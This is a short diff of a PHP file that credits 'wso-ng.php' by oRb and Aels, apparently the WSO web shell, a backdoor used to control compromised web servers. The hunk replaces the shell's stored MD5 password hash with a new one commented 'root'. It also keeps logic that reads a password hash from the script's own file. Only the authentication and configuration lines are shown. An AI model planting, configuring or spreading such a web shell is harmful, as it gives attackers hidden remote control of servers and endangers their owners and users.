@@ -1,7 +1,10 @@
 <?php
 
+// https://github.com/aels/wso-ng/blob/main/wso-ng.php
+// by oRb, rework by Aels
+
 preg_match('/.*pass *= ?"?([a-f0-9]{32}).*/si', @file_get_contents($_SERVER['SCRIPT_FILENAME']), $matches);
-$auth_pass = "ed78a48738eb97ffb5624741bdf391c3";
+$auth_pass = "63a9f0ea7bb98050796b649e85481845"; // root
 $auth_pass = isset($matches[1]) ? $matches[1] : $auth_pass;
 
 $color = "#df5";
